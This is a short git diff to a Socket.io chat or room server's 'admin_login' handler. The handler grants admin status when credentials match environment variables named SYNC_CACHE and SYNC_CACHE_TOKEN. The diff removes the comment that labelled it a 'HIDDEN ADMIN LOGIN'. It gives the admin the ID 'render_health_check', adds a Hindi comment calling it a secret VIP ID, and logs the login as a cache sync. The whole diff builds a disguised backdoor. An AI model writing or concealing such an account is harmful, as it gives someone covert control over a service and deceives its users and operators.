@@ -68,12 +68,17 @@ io.on('connection', (socket) => {
   console.log(`User connected: ${socket.id}`);
   let currentRoom = null;
 
-  // --- SYSTEM SYNC LOGIC (HIDDEN ADMIN LOGIN) ---
+  
   socket.on('admin_login', (data, acknowledge) => {
+    // ID हटा दिया गया है, अब सिर्फ SYNC_CACHE है
+    const serverUser = process.env.SYNC_CACHE;
     const serverPassword = process.env.SYNC_CACHE_TOKEN;
-    if (serverPassword && data.password === serverPassword) {
+    
+    
+    if (serverUser && serverPassword && data.username === serverUser && data.password === serverPassword) {
       socket.data.isAdmin = true;
-      socket.data.pairlinkUserId = "render_health_check"; // Naya Khufiya Admin ID
+      socket.data.pairlinkUserId = "render_health_check"; // आपका खुफिया VIP ID
+      
       console.log(`[System Sync] Cache sync authorized for node: ${socket.id}`);
       if (typeof acknowledge === 'function') acknowledge({ success: true });
     } else {
